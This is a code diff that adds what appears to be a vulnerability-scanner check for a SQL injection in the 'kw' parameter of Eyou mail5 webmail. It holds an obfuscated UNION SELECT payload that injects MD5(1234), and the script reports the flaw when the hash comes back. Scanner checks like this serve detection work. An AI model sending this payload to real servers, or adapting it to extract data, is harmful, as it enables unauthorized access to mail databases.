@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /user/?q=help&type=search&page=1&kw=-1%22)UnIoN/**/AlL/**/SeLeCt/**/1,2,3,Md5(1234),5,6,7%23
+#define bug = 81dc9bdb52d04dc20036dbd8313ed055
+#define info = 存在亿邮mail5 user 参数kw SQL注入漏洞
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
